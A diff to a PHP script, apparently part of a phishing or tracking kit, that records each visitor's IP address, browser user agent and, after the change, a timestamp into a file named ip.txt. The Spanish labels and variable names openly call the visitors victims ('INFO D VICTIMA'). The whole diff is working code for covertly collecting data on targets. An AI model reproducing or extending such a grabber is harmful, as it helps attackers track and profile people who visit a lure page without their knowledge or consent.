@@ -12,16 +12,19 @@ else
     {
         $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
     }
-$useragent = "INFO. D VICTIMA:  ";
+$useragent = "INFO D VICTIMA: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
-$separator = "\n===============================";
 
+$separator = "\n===============================\n";
+$fecha = date ('d-m-Y H:i:s');
+$hora = "FECHA: $fecha \n";
 
 $file = 'ip.txt';
 $victim = "\nIP: ";
 $fp = fopen($file, 'a');
 
 fwrite($fp, $separator );
+fwrite($fp, $hora);
 fwrite($fp, $victim );
 fwrite($fp, $ipaddress );
 fwrite($fp, $useragent );
